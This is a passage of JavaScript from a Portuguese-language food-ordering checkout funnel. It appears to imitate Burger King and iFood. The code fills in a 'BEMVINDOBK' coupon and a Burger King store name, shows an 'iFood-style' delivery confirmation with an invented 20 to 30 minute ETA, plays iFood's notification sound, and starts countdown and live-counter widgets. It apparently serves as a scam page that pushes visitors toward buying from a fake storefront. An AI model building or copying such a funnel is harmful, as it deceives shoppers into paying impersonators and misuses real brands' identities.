        const stateEl = document.getElementById('coupon-state-text');

        if(codeEl) codeEl.textContent = savedCoupon;
        if(auxEl) auxEl.textContent = getOrGenerateAuxCode();
        
        const d = new Date();
        d.setHours(d.getHours() + 1);
        const pad = (n) => String(n).padStart(2, '0');
        const vStr = `Válido até ${pad(d.getDate())}/${pad(d.getMonth()+1)}/${String(d.getFullYear()).slice(-2)} ÀS ${pad(d.getHours())}h${pad(d.getMinutes())}`;
        if(validEl) validEl.textContent = vStr;
        if(stateEl) stateEl.textContent = state.city || 'SÃO PAULO';
    }
});

// ─── INICIALIZAÇÃO GLOBAL ──────────────────────────
function initCheckout() {
    loadState();
    
    const page = window.location.pathname.split('/').pop();
    
    if (page === 'sacola.html') {
        renderCart();
        updateTotal();
        renderAddress();
    }
    
    if (page === 'dados.html') {
        const nInput = document.querySelector('#input-nome');
        if (nInput && state.nomeUser) nInput.value = state.nomeUser;
        const cInput = document.querySelector('#input-cep');
        if (cInput && state.cep) cInput.value = state.cep;
    }
    
    initCountdown();
    initLiveCounter();
    initTracker();
}

// 🚀 DISPARO IMEDIATO
document.addEventListener('DOMContentLoaded', initCheckout);
// 🚀 INICIALIZAÇÃO UNIVERSAL V7
document.addEventListener('DOMContentLoaded', () => {
    // Detecta em qual página estamos e inicializa o componente correto
    const path = window.location.pathname.toLowerCase();
    
    if (path.includes('sacola.html')) {
        renderCart();
        renderAddress();
        
        // FIX: Re-seleção visual do frete
        if (state.fretePrice !== undefined) {
            document.querySelectorAll('.frete-option').forEach(opt => {
                opt.classList.remove('selected');
                if (parseFloat(opt.dataset.frete || 0) === state.fretePrice) {
                    opt.classList.add('selected');
                }
            });
        }
        
        // BUGFIX V8: O storeEl pode ser null agora na transição fast-track
        const storeEl = document.querySelector('#review-store-name');
        if (storeEl) storeEl.textContent = state.selectedStore || 'Restaurante Burger King';
        
        // V8: Mostrar Cupom Aplicado inalterável na Sacola
        const savedCoupon = localStorage.getItem('bk_funil_coupon_v2') || 'BEMVINDOBK';
        const badgeCoupon = document.getElementById('badge-cupom-sacola');
        if(badgeCoupon) badgeCoupon.textContent = savedCoupon;
    }
    
    if (path.includes('lojas.html')) {
        renderStores();
    }
    
    if (path.includes('dados.html')) {
        setupCEPMask();
    }
    
    if (path.includes('entrega.html')) {
        // Inicializa UI de confirmação de entrega iFood-style
        const addrMain = state.street ? `${state.street}, ${state.number}` : `CEP ${state.cep}, Nº ${state.number}`;
        const addrSub = state.neighborhood ? `${state.neighborhood}, ${state.city}` : state.city;
        const total = (state.basePrice || 22.90) + (state.upsellTotal || 0) + (state.fretePrice || 0);
        let itemCount = 3 + (state.upsellItems ? state.upsellItems.length : 0);

        const now = new Date();
        const etaStart = new Date(now.getTime() + 20 * 60000);
        const etaEnd = new Date(now.getTime() + 30 * 60000);
        const formatTime = (d) => `${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}`;
        
        // Atualiza DOM
        const etaEl = document.querySelector('#ifood-eta-time');
        if(etaEl) etaEl.textContent = `${formatTime(etaStart)} - ${formatTime(etaEnd)}`;
        
        const streetEl = document.querySelector('#ifood-street-number');
        if(streetEl) streetEl.textContent = addrMain;
        
        const neighEl = document.querySelector('#ifood-neighborhood-city');
        if(neighEl) neighEl.textContent = addrSub;

        // Tenta tocar o áudio famoso de notificação
        setTimeout(() => {
            const audio = new Audio('https://www.myinstants.com/media/sounds/push-ifood.mp3');
            audio.play().catch(e => console.log('Notificação silenciada pelo adblock/autoplay.'));
        }, 1500);
    }
});
